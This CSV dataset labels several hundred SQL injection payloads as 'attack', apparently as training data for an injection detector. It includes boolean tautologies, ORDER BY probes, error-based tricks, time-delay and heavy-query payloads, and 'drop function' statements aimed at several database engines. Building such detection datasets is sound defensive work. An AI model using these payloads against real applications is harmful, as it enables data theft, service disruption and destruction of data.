label,payload,family
attack,1  )   as nmlm where 9872  =  9872,other
attack,1   )    )    as mcyh where 1001  =  1001,other
attack,1  )   as qort where 1554  =  1554,other
attack,"1',  (  select   (  case when   (  2073  =  5314  )   then 1 else 1/  (  select 0  )   end   )    )   ",other
attack,1'  )   where 5286  =  5286,other
attack,if  (  2697  =  2008  )   select 2697 else drop function jcoo--,other
attack,1  )   where 9167  =  9167,other
attack,"1""  )   as dien where 4022  =  4022",other
attack,1'||  (  select 'tezo' from dual where 4436  =  4436,other
attack,1'   )    )    as zari where 6847  =  6847,other
attack,"1%""   )    )     )  ",other
attack,1  )   where 1079  =  1079,other
attack,1'+  (  select 'vtyw' where 7950  =  7950 order by 1--,other
attack,"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  # ujdg",other
attack,1'+  (  select 'jmdl' where 7827  =  7827,other
attack,1  )   as qwsa where 2874  =  2874,other
attack,1'  )   where 8291  =  8291,other
attack,1  )   as ryks where 1196  =  1196,other
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",other
attack,1  )   where 5025  =  5025,other
attack,"-1550%""   )    )     )   order by 1--",other
attack,-6722'  )   order by 1#,other
attack,1 where 5443  =  5443,other
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",other
attack,select   (  case when   (  8916  =  1357  )   then 8916 else 8916*  (  select 8916 from information_schema.character_sets  )   end  )  #,other
attack,1'  )   where 7541  =  7541,other
attack,1'+  (  select 'zgtu' where 8419  =  8419,other
attack,1'   )    )    as pdcl where 6964  =  6964,other
attack,1' where 8864  =  8864,other
attack,1'||  (  select 'qstz' where 6835  =  6835,other
attack,1'  )   as hcpp where 1863  =  1863,other
attack,"select * from generate_series  (  1134,1134,case when   (  1134  =  4909  )   then 1 else 0 end  )   limit 1--",other
attack,"select * from generate_series  (  3086,3086,case when   (  3086  =  3327  )   then 1 else 0 end  )   limit 1--",other
attack,if  (  3245  =  6168  )   select 3245 else drop function nafj--,other
attack,1'+  (  select xzse where 4530  =  4530,other
attack,1'  )   where 3588  =  3588,other
attack,1'+  (  select idnb where 2338  =  2338,other
attack,-1257'  )   order by 1#,other
attack,"-6546""  )   order by 1#",other
attack,"1',  (  select   (  case when   (  5249  =  9648  )   then 1 else 1/  (  select 0  )   end   )    )   ",other
attack,select   (  case when   (  2783  =  9216  )   then 1 else 2783*  (  select 2783 from master..sysdatabases  )   end  )  --,other
attack,"1""  )   where 5491  =  5491",other
attack,"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",other
attack,"1',iif  (  9496  =  4153,1,1/0  )  ",other
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",other
attack,"1""   )    )    as jucs where 6836  =  6836",other
attack,1   )    )    as eigk where 2557  =  2557,other
attack,1'||  (  select 'gbyh' from dual where 5889  =  5889 order by 1#,other
attack,1'+  (  select 'tjvt' where 2463  =  2463,other
attack,"1""  )   as ronb where 9368  =  9368",other
attack,1   )    )    as oqyo where 7995  =  7995,other
attack,select   (  case when   (  5142  =  6855  )   then 5142 else 5142*  (  select 5142 from mysql.db  )   end  )  #,other
attack,select   (  case when   (  9130  =  1826  )   then 9130 else 9130*  (  select 9130 from mysql.db  )   end  )  #,other
attack,1'+  (  select ksoh where 6339  =  6339,other
attack,1   )    )    as pmff where 6649  =  6649,other
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ||'",other
attack,"1""   )    )    as xcyo where 2929  =  2929",other
attack,"select * from generate_series  (  9964,9964,case when   (  9964  =  4455  )   then 1 else 0 end  )   limit 1--",other
attack,select case when 6662  =  9889 then 1 else null end--,other
attack,select   (  case when   (  6045  =  2786  )   then 6045 else 1/  (  select 0  )   end  )  --,other
attack,select   (  case when   (  2132  =  8969  )   then 1 else 2132*  (  select 2132 from master..sysdatabases  )   end  )  --,other
attack,1  )   where 2940  =  2940,other
attack,"1""  )   as kzuq where 4259  =  4259",other
attack,"1"" where 3434  =  3434",other
attack, (  8362  =  9139  )  *9139,other
attack,1'||  (  select 'nwve' where 7721  =  7721,other
attack,1'+  (  select myci where 8903  =  8903,other
attack,"select * from generate_series  (  5980,5980,case when   (  5980  =  5063  )   then 1 else 0 end  )   limit 1--",other
attack,1 rlike   (  select   (  case when   (  8314  =  5463  )   then 1 else 0x28 end   )    ) ,other
attack,"-6520%""  )   order by 1#",other
attack,"1""   )    )    as pqbs where 4409  =  4409",other
attack,1' where 1628  =  1628,other
attack,if  (  5127  =  2829  )   select 5127 else drop function okos--,other
attack,"1""  )   where 9115  =  9115",other
attack,1'||  (  select 'mwpd' where 2887  =  2887,other
attack,"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   ",other
attack,1 where 2956  =  2956,other
attack,-4542'   )    )    order by 1#,other
attack,1  )   as imdt where 6431  =  6431,other
attack,select case when 4488  =  5522 then 1 else null end--,other
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",other
attack,select   (  case when   (  2294  =  3651  )   then 2294 else 2294*  (  select 2294 from information_schema.character_sets  )   end  )  #,other
attack,select   (  case when   (  8716  =  1338  )   then 1 else 8716*  (  select 8716 from master..sysdatabases  )   end  )  --,other
attack,"1',  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",other
attack,1'   )    )    as cwss where 9720  =  9720,other
attack,1'+  (  select biqo where 6046  =  6046,other
attack, (  select   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  select 6986 from mysql.db  )   end   )    ) ,other
attack,"1""  )   as ypfa where 6128  =  6128",other
attack,1'+  (  select plhk where 6540  =  6540,other
attack,select   (  case when   (  4996  =  1734  )   then 1 else 4996*  (  select 4996 from master..sysdatabases  )   end  )  --,other
attack,"select * from generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   limit 1--",other
attack,"call regexp_substring  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,null  )  --",other
attack,select   (  case when   (  3140  =  4625  )   then 1 else 3140*  (  select 3140 from master..sysdatabases  )   end  )  --,other
attack,-8369  )   where 7234  =  7234 order by 1--,other
attack,select   (  case when   (  4291  =  6937  )   then 4291 else 4291*  (  select 4291 from mysql.db  )   end  )  #,other
attack,1' where 8635  =  8635 order by 1--,other
attack,"1"" where 6179  =  6179",other
attack,1'  )   where 6842  =  6842,other
attack,"1""   )    )    as zbfj where 2285  =  2285",other
attack,-9429'  )   order by 1--,other
attack,select   (  case when   (  5152  =  7853  )   then 5152 else 5152*  (  select 5152 from mysql.db  )   end  )  #,other
attack,"1',  (  select   (  case when   (  4209  =  5879  )   then 1 else 4209*  (  select 4209 from information_schema.character_sets  )   end   )    )   ",other
attack,select   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  select 6002 from mysql.db  )   end  )  #,other
attack,1'+  (  select naiw where 4924  =  4924,other
attack,1  )   as tngy where 8956  =  8956 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,other
attack,1'  )   as ihsc where 3978  =  3978,other
attack,1'+  (  select dklj where 3265  =  3265,other
attack,1   )    )     )   order by 1#,other
attack,select   (  case when   (  4006  =  1276  )   then 1 else 4006*  (  select 4006 from master..sysdatabases  )   end  )  --,other
attack,"select count  (  *  )   from generate_series  (  1,5000000  )  # fnck",other
attack,1 order by 1#,other
attack,1  )   where 6472  =  6472,other
attack,-4595'  )   where 4892  =  4892 order by 1--,other
attack,1'+  (  select 'stdl' where 4581  =  4581,other
attack,1   )    )    as dqfl where 7527  =  7527,other
attack,"  (  select * from generate_series  (  3906,3906,case when   (  3906  =  3906  )   then 1 else 0 end  )   limit 1  )  ",other
attack,1' where 8469  =  8469,other
attack,1' in boolean mode  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   #,other
attack,"1""  )   as dgzf where 4834  =  4834",other
attack,-4324 order by 1--,other
attack,1  )   as uuro where 6784  =  6784,other
attack,"1,  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",other
attack,1  )   where 6424  =  6424,other
attack,1'||  (  select 'sxya' where 3578  =  3578,other
attack,"select * from generate_series  (  7667,7667,case when   (  7667  =  8232  )   then 1 else 0 end  )   limit 1--",other
attack,"1,iif  (  6333  =  1227,1,1/0  )  ",other
attack,"1""  )   as jqli where 7793  =  7793",other
attack,1'+  (  select 'kcix' where 1117  =  1117,other
attack,1'+  (  select 'jaok' where 2592  =  2592,other
attack,"1""   )    )    as jebl where 3464  =  3464",other
attack,"1""  )   as bksv where 5375  =  5375",other
attack,1' where 8729  =  8729,other
attack,select   (  case when   (  1868  =  5071  )   then 1 else 1868*  (  select 1868 from master..sysdatabases  )   end  )  --,other
attack,"1',  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",other
attack,1   )    )     ) ,other
attack,select   (  case when   (  8857  =  1512  )   then 8857 else 8857*  (  select 8857 from mysql.db  )   end  )  #,other
attack,"1',  (  select   (  case when   (  8640  =  8640  )   then   (  ascii  (  regexp_substring  (  repeat  (  right  (  char  (  8640  )  ,0  )  ,500000000  )  ,null   )    )     )   else 8640/  (  select 0 from information_schema.system_users  )   end  )   from information_schema.system_users  )  --",other
attack,1'+  (  select kzgg where 5070  =  5070,other
attack,1'+  (  select gblp where 6768  =  6768,other
attack,1'||  (  select 'jjpy' from dual where 6295  =  6295,other
attack,"iif  (  4460  =  1610,1,1/0  )  ",other
attack,1'||  (  select 'vwmg' where 7928  =  7928,other
attack,select   (  case when   (  9343  =  9513  )   then 1 else 9343*  (  select 9343 from master..sysdatabases  )   end  )  --,other
attack,if  (  4947  =  5350  )   select 4947 else drop function ereg--,other
attack,"1""   )    )    as xtlt where 9293  =  9293",other
attack,"1""  )   where 2152  =  2152",other
attack,1'+  (  select 'yhcf' where 8367  =  8367,other
attack,"1""  )   as bpmk where 4506  =  4506",other
attack,1'+  (  select qsmo where 3172  =  3172,other
attack,1'||  (  select 'kitk' where 6311  =  6311,other
attack,"1""   )    )    as qqhm where 7182  =  7182",other
attack,1'+  (  select 'kiqf' where 5920  =  5920,other
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- rucf",other
attack,"1""   )    )    as ylah where 9248  =  9248",other
attack,1'+  (  select 'tbfj' where 4016  =  4016,other
attack,1'||  (  select 'ogyu' from dual where 6691  =  6691,other
attack,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",other
attack,"1"" where 9173  =  9173 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",other
attack,1  )   where 3030  =  3030,other
attack,"1""  )   as pwvu where 8267  =  8267",other
attack,1'||  (  select 'tjzy' where 3037  =  3037,other
attack,"1'+  (  select 'vkis' where 3712  =  3712   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   +'",other
attack,1'  )   as fyib where 9246  =  9246,other
attack,"1""  )   where 7228  =  7228",other
attack,1'||  (  select 'qdkb' where 4331  =  4331,other
attack,1'||  (  select 'kyhs' from dual where 9491  =  9491,other
attack,1   )    )    as zykv where 2158  =  2158,other
attack,1   )    )    as fqee where 3286  =  3286,other
attack,"1""  )   where 7452  =  7452",other
attack,"-2860""   )    )    order by 1#",other
attack,"elt  (  2427  =  2427,5518  )  ",other
attack,1'   )    )    as fcjk where 7755  =  7755,other
attack,1'  )   where 3311  =  3311,other
attack,"1""  )   where 6964  =  6964",other
attack,1'  )   as wquy where 2518  =  2518,other
attack,1'+  (  select mhfn where 2425  =  2425,other
attack,1' where 8231  =  8231,other
attack,1'  )   as akvn where 8669  =  8669,other
attack,1'  )   as tqdg where 9355  =  9355,other
attack,1 where 3956  =  3956,other
attack,1  )   as afxc where 7497  =  7497,other
attack,-1711  )   where 9098  =  9098 order by 1#,other
attack,1'  )   as jlae where 1650  =  1650,other
attack,1 where 7038  =  7038,other
attack,1'+  (  select 'wsjk' where 3291  =  3291,other
attack,"1""  )   as wehx where 5744  =  5744",other
attack,select   (  case when   (  9556  =  7122  )   then 9556 else 9556*  (  select 9556 from information_schema.character_sets  )   end  )  #,other
attack,"1"" where 1386  =  1386",other
attack,"-9672%""   )    )     )   order by 1#",other
attack,"1"" where 5477  =  5477",other
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  -- vhmc",other
attack,1 where 5700  =  5700,other
attack,select   (  case when   (  4994  =  1572  )   then 4994 else 4994*  (  select 4994 from mysql.db  )   end  )  #,other
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- ygbf",other
attack,1'  )   order by 1#,other
attack,if  (  6624  =  4232  )   select 6624 else drop function xyyt--,other
attack,"1'||  (  select 'mjkz' where 9430  =  9430   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   ||'",other
attack,1' where 6003  =  6003 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,other
attack,"iif  (  3548  =  8646,1,1/0  )  ",other
attack,select case when 7634  =  3954 then 1 else null end--,other
attack,1'  )   where 4500  =  4500,other
attack,"select * from generate_series  (  7762,7762,case when   (  7762  =  1293  )   then 1 else 0 end  )   limit 1--",other
attack,1 where 3744  =  3744,other
attack,"1""  )   as eaxo where 2728  =  2728",other
attack,select   (  case when   (  3486  =  6373  )   then 3486 else 3486*  (  select 3486 from mysql.db  )   end  )  #,other
attack,select   (  case when   (  6969  =  5797  )   then 6969 else 6969*  (  select 6969 from information_schema.character_sets  )   end  )  #,other
attack,"1""   )    )     )   order by 1--",other
attack,1'   )    )    as tcby where 5213  =  5213,other
attack,"1',  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ",other
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual",other
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",other
attack,1'+  (  select 'mjgo' where 4026  =  4026,other
attack,"iif  (  8213  =  4718,1,1/0  )  ",other
attack,"  (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",other
attack,"1,  (  select   (  case when   (  6857  =  7623  )   then 1 else 6857*  (  select 6857 from information_schema.character_sets  )   end   )    )   ",other
attack,select   (  case when   (  7163  =  1777  )   then 1 else 7163*  (  select 7163 from master..sysdatabases  )   end  )  --,other
attack,"select * from generate_series  (  3379,3379,case when   (  3379  =  1219  )   then 1 else 0 end  )   limit 1--",other
attack,"iif  (  1746  =  1730,1,1/0  )  ",other
attack,"1"" where 5062  =  5062",other
attack,1  )   as jmib where 8130  =  8130 rlike   (  select   (  case when   (  7885  =  3932  )   then 1 else 0x28 end   )    )   --,other
attack,1'||  (  select 'lvso' where 5675  =  5675,other
attack,-9509'  )   where 9303  =  9303 order by 1#,other
attack,1  )   as zodp where 9112  =  9112,other
attack,select   (  case when   (  9030  =  6952  )   then 1 else 9030*  (  select 9030 from master..sysdatabases  )   end  )  --,other
attack,1'  )   where 6092  =  6092,other
attack,1 where 6304  =  6304,other
attack,1'  )   where 1115  =  1115,other
attack,1   )    )    as ndrh where 6308  =  6308,other
attack,1 rlike   (  select   (  case when   (  8911  =  5301  )   then 1 else 0x28 end   )    )   # pmuh,other
attack,1' in boolean mode  ) ,other
attack,1'  ) ,other
attack,1'  )   as zdhq where 5586  =  5586,other
attack,1' where 7176  =  7176,other
attack,1' rlike   (  select   (  case when   (  5384  =  7060  )   then 1 else 0x28 end   )    ) ,other
attack,select   (  case when   (  8663  =  7467  )   then 8663 else 1/  (  select 0  )   end  )  --,other
attack,1'+  (  select emeu where 2310  =  2310,other
attack,1'+  (  select nxfp where 5006  =  5006,other
attack,select   (  case when   (  9986  =  8342  )   then 9986 else 9986*  (  select 9986 from information_schema.character_sets  )   end  )  #,other
attack,1'   )    )    as uizu where 1774  =  1774,other
attack,-4882' order by 1#,other
attack,1 where 2301  =  2301,other
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  #",other
attack,1  )   where 8813  =  8813,other
attack, (  8266  =  8266  )  *9900,other
attack,select   (  case when   (  1227  =  4014  )   then 1227 else 1227*  (  select 1227 from mysql.db  )   end  )  #,other
attack,-7901  )   order by 1--,other
attack,1'||  (  select 'uedy' where 8816  =  8816,other
attack,1 where 4372  =  4372,other
attack,"1""  )   as vzdq where 3160  =  3160",other
attack,"1""   )    )    order by 1#",other
attack,select   (  case when   (  9376  =  4521  )   then 1 else 9376*  (  select 9376 from master..sysdatabases  )   end  )  --,other
attack,"1'+  (  select bptu where 7356  =  7356   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",other
attack,end-- elvi,other
attack,1   )    )    as xzcl where 2332  =  2332,other
attack,"1',  (  select   (  case when   (  7711  =  7711  )   then 1 else 7711*  (  select 7711 from information_schema.character_sets  )   end   )    )   ",other
attack,1'||  (  select 'ymre' where 8681  =  8681,other
attack,1   )    )    as vcvn where 2106  =  2106,other
attack,"1""  )   as ivuv where 5691  =  5691",other
attack,if  (  2643  =  1393  )   select 2643 else drop function nqss--,other
attack,"iif  (  2840  =  3788,1,1/0  )  ",other
attack,"1""   )    )    as xwrq where 4161  =  4161",other
attack,select   (  case when   (  2968  =  2021  )   then 1 else 2968*  (  select 2968 from master..sysdatabases  )   end  )  --,other
attack,1  )   as phja where 4627  =  4627,other
attack,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",other
attack,select   (  case when   (  4043  =  5276  )   then 4043 else 4043*  (  select 4043 from information_schema.character_sets  )   end  )  #,other
attack,1%'  )   order by 1#,other
attack,"iif  (  1149  =  4765,1,1/0  )  ",other
attack,1'+  (  select 'vddk' where 6961  =  6961,other
attack,1 where 6500  =  6500,other
attack,1'+  (  select wpbj where 1849  =  1849,other
attack,"iif  (  6369  =  5881,1,1/0  )  ",other
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  +'",other
attack,1' where 2183  =  2183,other
attack,"1,  (  case when 2872  =  2872 then 1 else null end  )  ",other
attack,1'  )   where 5331  =  5331,other
attack,1'   )    )    as xqam where 6750  =  6750,other
attack,"1""  )   where 8098  =  8098",other
attack,1'   )    )    as wdor where 7426  =  7426,other
attack,"-3930%""   )    )    order by 1#",other
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual#",other
attack,"1',  (  select * from generate_series  (  2636,2636,case when   (  2636  =  7071  )   then 1 else 0 end  )   limit 1  )  ",other
attack,select   (  case when   (  3859  =  6938  )   then 3859 else 3859*  (  select 3859 from mysql.db  )   end  )  #,other
attack,1'+  (  select 'xbyn' where 6881  =  6881,other
attack,-7277   )    )     )   order by 1#,other
attack,if  (  7340  =  9813  )   select 7340 else drop function yppp--,other
attack,"iif  (  5257  =  5257,1,1/0  )  ",other
attack,"1',  (  select   (  case when   (  9644  =  9644  )   then dbms_pipe.receive_message  (  chr  (  75  )  ||chr  (  78  )  ||chr  (  104  )  ||chr  (  98  )  ,5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",other
attack,"1""  )   as ebvt where 5305  =  5305",other
attack,1'   )    )     ) ,other
attack,1'  )   as xbsc where 6772  =  6772,other
attack,1'+  (  select 'hhnz' where 2465  =  2465,other
attack,1'||  (  select 'kzkr' from dual where 2778  =  2778,other
attack,1 where 9752  =  9752,other
attack,1'||  (  select 'yezk' where 2097  =  2097,other
attack, (  case when 8422  =  8452 then 1 else null end  ) ,other
attack,"1""  )   where 1410  =  1410",other
attack,-2530%' order by 1#,other
attack,-6512'+  (  select 'zdjx' where 5454  =  5454 order by 1--,other
attack,select   (  case when   (  9434  =  2780  )   then 9434 else 9434*  (  select 9434 from information_schema.character_sets  )   end  )  #,other
attack,1 where 6365  =  6365,other
attack,if  (  9770  =  9748  )   select 9770 else drop function zyuo--,other
attack,end  )  ||',other
attack,1 where 7882  =  7882,other
attack,"1',  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  ",other
attack,"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",other
attack,"1,  (  select   (  case when   (  5217  =  5217  )   then 1 else 5217*  (  select 5217 from mysql.db  )   end   )    )   ",other
attack,1'+  (  select hett where 7228  =  7228,other
attack,-9072  )   as saot where 2278  =  2278 order by 1#,other
attack,select   (  case when   (  1093  =  7693  )   then 1093 else 1/  (  select 0  )   end  )  --,other
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",other
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",other
attack,"1"" where 8387  =  8387",other
attack,"1,  (  select   (  case when   (  7711  =  7711  )   then 1 else 7711*  (  select 7711 from information_schema.character_sets  )   end   )    )   ",other
attack,"1',iif  (  7475  =  7475,1,1/0  )  ",other
attack,1   )    )    as bsvo where 3605  =  3605,other
attack,1'+  (  select smze where 5616  =  5616,other
attack,select   (  case when   (  4059  =  7807  )   then 4059 else 1/  (  select 0  )   end  )  --,other
attack,-9809' order by 1--,other
attack,"1',  (  select   (  case when   (  5217  =  5217  )   then 1 else 5217*  (  select 5217 from mysql.db  )   end   )    )   ",other
attack,"iif  (  9342  =  6508,1,1/0  )  ",other
attack,"select * from generate_series  (  7754,7754,case when   (  7754  =  1252  )   then 1 else 0 end  )   limit 1--",other
attack,"1""  )   where 7753  =  7753",other
attack,"elt  (  2567  =  9921,9921  )  ",other
attack,1'||  (  select 'rdqv' from dual where 1894  =  1894,other
attack,"-2340%"" order by 1#",other
attack,1  )   where 4992  =  4992,other
attack,1'  )   as pghp where 9086  =  9086,other
attack,"1,  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4932  =  4932  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",other
attack,1   )    )    as eveb where 7567  =  7567,other
attack,"-9684"" order by 1#",other
attack,1'||  (  select 'yyil' from dual where 3121  =  3121,other
attack,1'||  (  select 'vdeo' where 4355  =  4355,other
attack,1'||  (  select 'vpuh' where 8164  =  8164,other
attack,1'   )    )    as kgfp where 2366  =  2366,other
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   +'",other
attack,1  )   where 5651  =  5651,other
attack,1   )    )    as ctqr where 2609  =  2609,other
attack,1  )   where 4866  =  4866,other
attack,1'||  (  select 'uebk' from dual where 6990  =  6990,other
attack,-7984' order by 1--,other
attack,"1"" where 6352  =  6352",other
attack,"1""  )   as axua where 6718  =  6718",other
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",other
attack,1%'   )    )    order by 1--,other
attack, (  select   (  case when   (  9066  =  5598  )   then 1 else 9066*  (  select 9066 from information_schema.character_sets  )   end   )    ) ,other
attack,1'   )    )    as jtmf where 3937  =  3937,other
attack,-9975 where 9760  =  9760 order by 1--,other
attack,1'+  (  select hrgu where 9587  =  9587,other
attack,1' where 9544  =  9544,other
attack,if  (  5316  =  4416  )   select 5316 else drop function vtve--,other
attack,"1"" where 8234  =  8234",other
attack,"1,  (  select   (  case when   (  3743  =  9640  )   then 1 else 3743*  (  select 3743 from master..sysdatabases  )   end   )    )   ",other
attack,1'  )   as pwqs where 2291  =  2291,other
attack,1  )   where 9307  =  9307,other
attack,select   (  case when   (  1407  =  2741  )   then 1407 else 1407*  (  select 1407 from mysql.db  )   end  )  #,other
attack,"1"" where 8732  =  8732",other
attack,1'||  (  select 'sliy' where 9494  =  9494,other
attack,1'  )   as syer where 3141  =  3141 rlike   (  select   (  case when   (  6233  =  7567  )   then 1 else 0x28 end   )    )   --,other
attack,1   )    )     )   order by 1--,other
attack,select   (  case when   (  6047  =  8897  )   then 6047 else 6047*  (  select 6047 from information_schema.character_sets  )   end  )  #,other
attack,"1,  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",other
attack,select case when 4656  =  3716 then 1 else null end--,other
attack,"1"" where 8571  =  8571",other
attack,end#,other
attack,1'   )    )    as wqhm where 9871  =  9871,other
attack,select   (  case when   (  2576  =  7563  )   then 2576 else 1/  (  select 0  )   end  )  --,other
attack,select case when 8514  =  3207 then 1 else null end--,other
attack,if  (  8727  =  4039  )   select 8727 else drop function giql--,other
attack,1' in boolean mode  )   rlike   (  select   (  case when   (  1343  =  1595  )   then 1 else 0x28 end   )    )   #,other
attack,1'  )   where 2227  =  2227,other
attack,1  )   order by 1--,other
attack,"iif  (  9229  =  4158,1,1/0  )  ",other
attack,1'   )    )    order by 1--,other
attack,select   (  case when   (  2352  =  8672  )   then 2352 else 2352*  (  select 2352 from information_schema.character_sets  )   end  )  #,other
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",other
attack,"1""  )   as xrsi where 9498  =  9498",other
attack,1   )    )    as xcsm where 9231  =  9231,other
attack,"1""  )   as vdim where 1296  =  1296",other
attack,1'||  (  select 'avxz' from dual where 7815  =  7815,other
